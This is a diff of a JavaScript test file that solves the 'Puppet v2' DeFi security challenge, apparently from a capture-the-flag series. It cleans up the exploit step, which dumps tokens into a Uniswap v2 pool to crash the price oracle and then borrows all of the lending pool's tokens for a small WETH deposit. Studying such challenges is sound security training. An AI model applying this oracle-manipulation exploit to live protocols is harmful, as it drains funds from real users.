@@ -82,21 +82,13 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Exploit', async function () {
-        const printPrices = async () => {
-            const balance = await this.weth.balanceOf(this.uniswapExchange.address);
-            console.log(`weth balance : ${balance}`);
-
-            const deposit = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
-            console.log(`WETH deposit required to borrow all tokens: ${deposit}`);
-        };
-
-        // same strategy as before, deplete the uniswapv2 pool's ETH balance that drives down the DVT token price
-        // borrow all the token for a bargain ETH price
-        await printPrices();
+        // same strategy as before, deplete the uniswap v2 pool's WETH balance that drives down the DVT token price
+        // borrow all the token for a bargain WETH price
 
         const path = [];
         path[0] = this.token.address;
         path[1] = this.weth.address;
+
         // swap all DVT token for ETH
         await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
         const timeStamp = (await ethers.provider.getBlock('latest')).timestamp + 1000;
@@ -109,15 +101,17 @@ describe('[Challenge] Puppet v2', function () {
 
         let attackerETHBalance = await ethers.provider.getBalance(attacker.address);
         let attackerETHBalanceMinusGasCost = attackerETHBalance.sub(ethers.utils.parseEther('0.1'));
-        console.log(`attackers ETH balance: ${attackerETHBalance}`);
-        console.log(`attackers ETH balance minus gas: ${attackerETHBalanceMinusGasCost}`);
-        printPrices();
 
-        // Wrap ether and approve to pool
+        // verify that the attacker has more ETH than the required WETH amount to borrow all tokens from the pool
+        expect(
+            await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+        ).to.be.lt(attackerETHBalanceMinusGasCost);
+
+        // wrap ether and approve to pool
         await this.weth.connect(attacker).deposit({ value: attackerETHBalanceMinusGasCost, gasLimit: 1e5});
         await this.weth.connect(attacker).approve(this.lendingPool.address, attackerETHBalanceMinusGasCost);
 
-        // borrow all token
+        // borrow all tokens
         const tx2 = await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
         await tx2.wait();
     });
